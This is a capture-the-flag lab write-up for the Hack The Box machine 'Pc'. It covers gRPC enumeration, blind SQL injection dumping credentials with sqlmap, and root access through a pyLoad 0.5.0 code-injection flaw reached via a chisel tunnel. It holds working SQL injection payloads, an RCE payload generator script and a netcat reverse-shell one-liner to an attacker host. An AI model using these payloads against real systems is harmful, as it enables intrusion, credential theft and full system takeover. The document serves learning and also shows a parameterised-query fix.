![pc.png](pc.png)

# Pc

## Enum
```bash
nmap -Pn -sC -sV 10.10.11.214 -oN scans/nmap.initial
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 08:49 IST
Nmap scan report for 10.10.11.214
Host is up (0.034s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds
```

```bash
sudo nmap -Pn -sU --min-rate 10000 10.10.11.214 -oN scans/nmap.udp
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 08:51 IST
Nmap scan report for 10.10.11.214
Host is up.
All 1000 scanned ports on 10.10.11.214 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```

```bash
sudo nmap -Pn -p- 10.10.11.214 -oN scans/nmap.udp
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 08:51 IST
Nmap scan report for 10.10.11.214
Host is up.
All 1000 scanned ports on 10.10.11.214 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
[blnkn@Kolossus](main %=):~/sec/htb/machines/pc%
[blnkn@Kolossus](main %=):~/sec/htb/machines/pc%                                                130 ⨯
[blnkn@Kolossus](main %=):~/sec/htb/machines/pc% nmap -p- -Pn -sC -sV 10.10.11.214 -oN scans/nmap.initial
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 08:52 IST
Nmap scan report for 10.10.11.214
Host is up (0.029s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=5/21%Time=6469CE47%P=aarch64-unknown-linux-g
SF:nu%r(NULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xf
SF:f\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(G
SF:enericLines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\
SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r
SF:(GetRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\
SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r
SF:(HTTPOptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff
SF:\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%
SF:r(RTSPRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xf
SF:f\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")
SF:%r(RPCCheck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\
SF:xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r
SF:(DNSVersionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xf
SF:f\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0
SF:\0\0\0\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\
SF:0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04
SF:\x08\0\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x
SF:04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\
SF:x04\x08\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04
SF:\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x0
SF:4\x08\0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04
SF:\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x0
SF:4\x08\0\0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.25 seconds
```

```bash
curl http://10.10.11.214:50051
curl: (1) Received HTTP/0.9 when not allowed

nc 10.10.11.214 50051
???
```

If waiting long enough while saying nothing on the socket we get this error:
```bash
nc 10.10.11.214 50051
???@Did not receive HTTP/2 settings before handshake timeout
```

A little bit of Google dorking brings us [here](https://github.com/grpc/grpc/blob/f3574e3f642fdb74424ab97ed7c4d6c182f651f0/src/core/ext/transport/chttp2/server/chttp2_server.cc#L427)

[https://zweilosec.github.io/posts/laser/](https://zweilosec.github.io/posts/laser/)  
[https://grpc.io/docs/what-is-grpc/introduction/](https://grpc.io/docs/what-is-grpc/introduction/)  
[https://grpc.io/docs/languages/python/basics/#client](https://grpc.io/docs/languages/python/basics/#client)  
[https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)  

Following the quickstart guide for python
```bash
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
python -m pip install grpcio
python -m pip install grpcio-tools
python3 -m protoc --version
git clone -b v1.55.0 --depth 1 --shallow-submodules https://github.com/grpc/grpc ~/grpc
cd ~/grpc/examples/python/helloworld
```

```bash
python greeter_server.py
Server started, listening on 50051
```

```bash
python greeter_client.py
Will try to greet world ...
Greeter client received: Hello, you!
```

Found grpcurl, looks like we can use this to enumerate the gRPC services present on this endpoint
```bash
docker pull fullstorydev/grpcurl:latest
docker run fullstorydev/grpcurl --plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

List `methods` on the `SimpleApp` `service`
```bash
docker run fullstorydev/grpcurl --plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

Describe `services` on `SimpleApp` 
```bash
docker run fullstorydev/grpcurl --plaintext 10.10.11.214:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
```

I should be able to describe the message types, but it's not working for me, not sure what I'm doing wrong
```bash
docker run fullstorydev/grpcurl -format text -d 'name: "gRPCurl"' --plaintext 10.10.11.214:50051 describe SimpleApp.RegisterUserRequest
Warning: The -d argument is not used with 'list' or 'describe' verb.
Failed to resolve symbol "SimpleApp.RegisterUserRequest": Symbol not found: SimpleApp.RegisterUserRequest
```

But it doesn't matter, it's easy to guess, the errors are pretty telling
```bash
docker run fullstorydev/grpcurl -format text -d 'username: "blnkn", password: "blnkn"' --plaintext 10.10.11.214:50051 SimpleApp.RegisterUser
message: "Account created for user blnkn!"
```

```bash
docker run fullstorydev/grpcurl -format text -d 'username: "blnkn", password: "blnkn"' --plaintext 10.10.11.214:50051 SimpleApp.LoginUser
message: "Your id is 848."
```

Ah! I managed to make the message description work
```bash
docker run fullstorydev/grpcurl --plaintext 10.10.11.214:50051 describe .getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
```

But If I try to use the getInfo method with the id I got from the login I get that response
```bash
docker run fullstorydev/grpcurl -format text -d 'id: "314"' --plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "Authorization Error.Missing 'token' header"
```

Using the verbose output on login, we get back a token
```bash
docker run fullstorydev/grpcurl -v -format text -d 'username: "blnkn", password: "blnkn"' --plaintext 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
message: "Your id is 588."

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ2NzE3MTZ9.Dief11zbyraZtatsTOjZPY5gTGVLuHtWk9dMcrYU-BI'
Sent 1 request and received 1 response
```

Not sure how to pass the token properly
```bash
docker run fullstorydev/grpcurl -vv -H "token: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ2NzM0MzR9.xmXfeEpCdoXGOsRd5LgxadumMUkiTHIWBk8Iar_-miE'" --format text -d 'id: "686"' --plaintext 10.10.11.214:50051 SimpleApp.getInfo

Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ2NzM0MzR9.xmXfeEpCdoXGOsRd5LgxadumMUkiTHIWBk8Iar_-miE'

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 44 bytes

Response contents:
message: "Authorization Error.Missing 'token' header"

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

Mmmmh also, maybe grpcurl is not the offical solution, there's also grpc-cli.  
Let's try to compile that
```bash
sudo apt-get update 
sudo apt-get upgrade -y
sudo apt-get install build-essential autoconf libtool pkg-config cmake -y
git clone https://github.com/grpc/grpc.git
cd grpc
git submodule update --init
sudo apt-get install -y libsystemd-dev
mkdir -p cmake/build
cd cmake/build
cmake -DgRPC_BUILD_TESTS=ON ../..
make grpc_cli
cp grpc_cli ~/.local/bin
which grpc_cli
/home/blnkn/.local/bin/grpc_cli
```


Getting familiar with `grpc_cli`
```bash
grpc_cli
No command specified
  grpc_cli ls ...         ; List services
  grpc_cli call ...       ; Call method
  grpc_cli type ...       ; Print type
  grpc_cli parse ...      ; Parse message
  grpc_cli totext ...     ; Convert binary message to text
  grpc_cli tojson ...     ; Convert binary message to json
  grpc_cli tobinary ...   ; Convert text message to binary
  grpc_cli help ...       ; Print this message, or per-command usage
```

```bash
grpc_cli ls 10.10.11.214:50051
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

```bash
grpc_cli ls 10.10.11.214:50051 SimpleApp
LoginUser
RegisterUser
getInfo
```

```bash
grpc_cli ls -l 10.10.11.214:50051 SimpleApp
filename: app.proto
service SimpleApp {
  rpc LoginUser(LoginUserRequest) returns (LoginUserResponse) {}
  rpc RegisterUser(RegisterUserRequest) returns (RegisterUserResponse) {}
  rpc getInfo(getInfoRequest) returns (getInfoResponse) {}
}
```

```bash
grpc_cli type 10.10.11.214:50051 getInfoRequest
message getInfoRequest {
  string id = 1;
}
```

```bash
grpc_cli type 10.10.11.214:50051 LoginUserRequest

message LoginUserRequest {
  string username = 1;
  string password = 2;
}
```

```bash
grpc_cli type 10.10.11.214:50051 RegisterUserRequest
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}
```

```bash
grpc_cli call 10.10.11.214:50051 SimpleApp.RegisterUser 'username: "blnkn", password: "blnkn"'
connecting to 10.10.11.214:50051
message: "User Already Exists!!"
Rpc succeeded with OK status
```

```bash
grpc_cli call 10.10.11.214:50051 SimpleApp.LoginUser 'username: "blnkn", password: "blnkn"'
connecting to 10.10.11.214:50051
message: "Your id is 317."
Received trailing metadata from server:
token : b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ2NzQ5NTV9.FOxpXVX1IpCCFq55UN0wdJvBbzsmgxafhS69bTeixto'
Rpc succeeded with OK status
```



## Manual blind Boolean based injection 

We have 2 tables
```json
{ "id":"653 or  (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' )=2" }
```

First table name is of length 8
```json
{ "id":"653 or (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=8" }
```

For reference
```bash
ascii -x
   00 NUL    10 DLE    20      30 0    40 @    50 P    60 `    70 p
   01 SOH    11 DC1    21 !    31 1    41 A    51 Q    61 a    71 q
   02 STX    12 DC2    22 "    32 2    42 B    52 R    62 b    72 r
   03 ETX    13 DC3    23 #    33 3    43 C    53 S    63 c    73 s
   04 EOT    14 DC4    24 $    34 4    44 D    54 T    64 d    74 t
   05 ENQ    15 NAK    25 %    35 5    45 E    55 U    65 e    75 u
   06 ACK    16 SYN    26 &    36 6    46 F    56 V    66 f    76 v
   07 BEL    17 ETB    27 '    37 7    47 G    57 W    67 g    77 w
   08 BS     18 CAN    28 (    38 8    48 H    58 X    68 h    78 x
   09 HT     19 EM     29 )    39 9    49 I    59 Y    69 i    79 y
   0A LF     1A SUB    2A *    3A :    4A J    5A Z    6A j    7A z
   0B VT     1B ESC    2B +    3B ;    4B K    5B [    6B k    7B {
   0C FF     1C FS     2C ,    3C <    4C L    5C \    6C l    7C |
   0D CR     1D GS     2D -    3D =    4D M    5D ]    6D m    7D }
   0E SO     1E RS     2E .    3E >    4E N    5E ^    6E n    7E ~
   0F SI     1F US     2F /    3F ?    4F O    5F _    6F o    7F DEL
```

First table name is `accounts`
```json
{ "id":"653 or (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('a')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,2,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('c')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,3,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('c')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,4,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('o')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,5,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('u')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,6,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('n')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,7,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('t')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,8,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('s')" }
```

Second table probably is `messages`
```json
{ "id":"653 or (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1) = hex('m')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,2,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1) = hex('e')" }
{ "id":"653 or (SELECT hex(substr(tbl_name,3,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1) = hex('s')" }
```

Now that we know the table names, we want to get the collumns and their values.  
I've been working based manually based of the techniques described here so far: [https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)  

But I stalled on this, couldn't really make it work, so a took a break.
```
(select hex(substr(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')+1)),instr((substr(sql,instr(sql,'(')+1)),'`')),\\\"TEXT\\\",''),\\\"INTEGER\\\",''),\\\"AUTOINCREMENT\\\",''),\\\"PRIMARY KEY\\\",''),\\\"UNIQUE\\\",''),\\\"NUMERIC\\\",''),\\\"REAL\\\",''),\\\"BLOB\\\",''),\\\"NOT NULL\\\",''),\\\",\\\",'~~'),\\\"`\\\",\\\"\\\"),1,1)) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' and name='accounts') < hex('a')
```

After my break I asked for a hint, and was pointed to this: [https://github.com/fullstorydev/grpcui](https://github.com/fullstorydev/grpcui)  
Well that makes everything 100 times easyer, and that's by the same devs that made the grpcurl... So right in front of my now the whole time ffs   
As far as I understand this actually sends REST requests in HTTP 1.1 to the server, and those are translated, by the server to gRPC [https://github.com/grpc-ecosystem/grpc-gateway](https://github.com/grpc-ecosystem/grpc-gateway)  
I actually knew this as I've seen this at work, also though about it in the context of this box and tried to make things work in REST really breafly, but assumed it wasn't setup on the server. 
Anyways, this things sets up a local webserver gui that takes your gRPC input and sends stuff over HTTP 1.1 REST to the server, so we can just capture a getInfo request, feed it to sqlmap and avoid the headache of doing this manually  
![gui.png](gui.png)  
![res.png](res.png)  

The HTTP 1.1 request from burp
```
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:41297
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: loji4zaSqKuSR7cLn3_CDboa8tU7ADLmX1Ch9GwOOqo
X-Requested-With: XMLHttpRequest
Content-Length: 200
Origin: http://127.0.0.1:41297
Connection: close
Referer: http://127.0.0.1:41297/
Cookie: _grpcui_csrf_token=loji4zaSqKuSR7cLn3_CDboa8tU7ADLmX1Ch9GwOOqo
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
  "metadata": [
    {
      "name": "token",
      "value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ3MTA4MDN9.MSlBzmJYp13-PV_H3P20WyO5ponKssSVQON1razjAJk"
    }
  ],
  "data": [
    {
      "id": "112 or 1=1"
    }
  ]
}
```

Pointing sqlmap to the things we already established, to speed up the process
```bash
sqlmap -r getinfo.req --dbms sqlite --technique=B --level 5 --risk 3 -t5 -T accounts --batch
SNIP
sqlmap identified the following injection point(s) with a total of 1256 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmxua24iLCJleHAiOjE2ODQ3MTA4MDN9.MSlBzmJYp13-PV_H3P20WyO5ponKssSVQON1razjAJk"}],"data":[{"id":"-5513 OR 6714=6714"}]}
---
```

```bash
sqlmap -r getinfo.req --dbms sqlite --technique=B --level 5 --risk 3 -t5 -T accounts --batch --dump
Database: <current>
Table: accounts
[3 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
| schnitzel              | wiener   |
+------------------------+----------+
```

```bash
sqlmap -r getinfo.req --dbms sqlite --technique=B --level 5 --risk 3 -t 15 -T messages --batch --dump
Database: <current>
Table: messages
[2 entries]
+-----+----------------------------------------------+----------+
| id  | message                                      | username |
+-----+----------------------------------------------+----------+
| 1   | The admin is working hard to fix the issues. | admin    |
| 105 | Will update soon.                            | wiener   |
+-----+----------------------------------------------+----------+
```

Looking at sqlmap verbose output this is how it did it:
```json
{"id":"-6907 OR SUBSTR((SELECT COALESCE(CAST(sql AS TEXT),CHAR(32)) FROM sqlite_master WHERE type=CHAR(116,97,98,108,101) AND tbl_name=CHAR(97,99,99,111,117,110,116,115) LIMIT 1),33,1)>CHAR(96)"}
```

```
ssh sau@10.10.11.214
sau@10.10.11.214's password:
Last login: Sun May 21 20:43:02 2023 from 10.10.16.76
sau@pc:~$
sau@pc:~$
sau@pc:~$
sau@pc:~$ pwd
/home/sau
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
sau@pc:~$ wc -c user.txt
33 user.txt
```

Looking at `/opt/app/app.py` this is what got us in
```python
    async def getInfo(self, request, context):
        headers = dict(context.invocation_metadata())
        token = headers.get('token')
        user_id = middle.authorization(token)
        if user_id is True:
            try:
                result = cur.execute(f'SELECT message from messages where id = {request.id}').fetchone()[0]
                return app_pb2.getInfoResponse(message=f"{result}")
            except sqlite3.Error as er:
                return app_pb2.getInfoResponse(message=er)
        return app_pb2.getInfoResponse(message="Authorization Error.Missing 'token' header")
```

And this is how we could fix it
```python
    async def getInfo(self, request, context):
        headers = dict(context.invocation_metadata())
        token = headers.get('token')
        user_id = middle.authorization(token)
        if user_id is True:
            try:
                result = cur.execute('SELECT message from messages where id = ?', (request.id, )).fetchone()[0]
                return app_pb2.getInfoResponse(message=f"{result}")
            except sqlite3.Error as er:
                return app_pb2.getInfoResponse(message=er)
        return app_pb2.getInfoResponse(message="Authorization Error.Missing 'token' header")
```


## Privesc

```bash
sau@pc:~$ sudo -l
[sudo] password for sau:
Sorry, try again.
[sudo] password for sau:
Sorry, user sau may not run sudo on localhost.
```

```bash
sau@pc:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
sau:x:1001:1001::/home/sau:/bin/bash
```

```bash
sau@pc:~$ netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        31968      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          32645      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      0          33661      -
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      0          34098      -
tcp6       0      0 :::22                   :::*                    LISTEN      0          32647      -
tcp6       0      0 :::50051                :::*                    LISTEN      0          33952      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        31967      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          27627      -
```

```bash
sau@pc:~$ curl -i http://127.0.0.1:8000
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 275
Location: /login?next=http%3A%2F%2F127.0.0.1%3A8000%2F
Vary: Accept-Encoding
Date: Sun, 21 May 2023 21:16:49 GMT
Server: Cheroot/8.6.0

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F</a>. If not, click the link.
```

Setting up a socks5 chisel server
```bash
local# ./chisel-arm server -p 4242 --socks5 --reverse
remote# ./chisel-amd client 10.10.14.207:4242 R:1080:socks
```

Connecting to the app through the proxy  
![pyload.png](pyload.png)


Things I see flying through in pspy64
```
2023/05/21 21:29:20 CMD: UID=0    PID=1038   | /usr/bin/python3 /usr/local/bin/pyload
2023/05/21 21:29:20 CMD: UID=0    PID=1032   | /usr/bin/python3 /opt/app/app.py
2023/05/21 21:29:20 CMD: UID=0    PID=103    |
```
```
2023/05/21 21:30:01 CMD: UID=0    PID=175023 | /usr/sbin/CRON -f
2023/05/21 21:30:01 CMD: UID=0    PID=175024 |
2023/05/21 21:30:01 CMD: UID=0    PID=175025 | /usr/bin/cp /root/sqlite.db.bak /opt/app/sqlite.db
```


```bash
sau@pc:/usr/local/bin$ pyload -h
usage: pyload [-h] [-d] [-r] [--storagedir STORAGEDIR] [--userdir USERDIR] [--tempdir TEMPDIR]
              [--pidfile PIDFILE] [--dry-run] [--daemon] [--quit] [--status] [--version]

       ____________
   ___/       |    \_____________ _ _______________ _ ___
  /   |    ___/    |    _ __ _  _| |   ___  __ _ __| |   \
 /    \___/  ______/   | '_ \ || | |__/ _ \/ _` / _` |    \
 \        |   ◯|       | .__/\_, |____\___/\__,_\__,_|    /
  \_______\    /_______|_|___|__/________________________/
           \  /
            \/

The free and open-source Download Manager written in pure Python

optional arguments:
  -h, --help            show this help message and exit
  -d, --debug           enable debug mode
  -r, --reset           reset default username/password
  --storagedir STORAGEDIR
                        use this location to save downloads
  --userdir USERDIR     use this location to store user data files
  --tempdir TEMPDIR     use this location to store temporary files
  --pidfile PIDFILE     set the full path to the pidfile
  --dry-run             test start-up and exit
  --daemon              run as daemon
  --quit                quit running pyLoad instance
  --status              display pid if running or 0
  --version             show program's version number and exit
sau@pc:/usr/local/bin$ pyload --version
pyLoad 0.5.0
```

[https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d](https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d)  
[https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)  

```
proxychains -q curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
    --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Sun, 21 May 2023 22:07:18 GMT
Server: Cheroot/8.6.0

Could not decrypt key
```

A straight copy paste of the PoC just works
```bash
sau@pc:/tmp$ date; ls -la /tmp/pwnd
Sun May 21 22:10:04 UTC 2023
-rw-r--r-- 1 root root 0 May 21 22:10 /tmp/pwnd
```

The original payload
```
%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29
```
==
```python
pyimport os;os.system("touch /tmp/pwnd")
```

Making a payload generator
```python
import sys
import requests

payload = f'pyimport os;os.system("{sys.argv[1]}")'
#print(payload)

enc_payload = []
for char in payload:
    enc_payload.append(hex(ord(char)))

enc_payload="".join(enc_payload).replace("0x","%")
#print(enc_payload)

enc_payload='package=xxx&crypted=AAAA&jk='+enc_payload+';f=function%20f2(){};&passwords=aaaa'
res = requests.post(
    url='http://127.0.0.1:8000/flash/addcrypted2',
    headers={"Host": "127.0.0.1:8000", "Content-Type": "application/x-www-form-urlencoded"},
    data=enc_payload,
    proxies={"http": "socks5://127.0.0.1:1080"}
)
print(res.status_code)
```
```bash
python3 payloader.py 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.3 4000 >/tmp/f'
```
```
rlwrap nc -lvnp 4000
listening on [any] 4000 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.214] 46632
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
